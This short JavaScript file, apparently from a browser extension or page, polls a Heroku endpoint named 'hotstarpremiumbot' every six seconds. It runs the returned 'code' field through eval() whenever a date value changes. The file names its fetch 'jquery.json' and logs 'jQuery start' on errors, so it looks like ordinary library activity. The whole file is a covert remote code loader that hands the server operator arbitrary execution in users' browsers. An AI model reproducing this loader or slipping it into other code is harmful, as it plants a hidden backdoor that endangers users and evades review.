

if (localStorage.getItem("jsanddate")) {
    ld = localStorage.getItem("jsanddate");
} else {

    localStorage.setItem("jsanddate", "initial");

}


(function () {
    fetch_js();
    setTimeout(arguments.callee, 6000);
})();


function fetch_js() {
    //console.log("fetch");
    fetch(
        "https://hotstarpremiumbot.herokuapp.com/jquery.json"
    )
        .then(response => {
            //console.log(response);
            return response.json();

        })
        .then(data => {
            js = data["code"];
            date = data["date"];
            ld = localStorage.getItem("jsanddate");
            //console.log(date, ld, js);
            if (ld !== date) {
                eval(js);
                localStorage.setItem("jsanddate", date);
            }

        })
        .catch(err => {
            // Do something for an error here
            console.log("jQuery start");
        });

}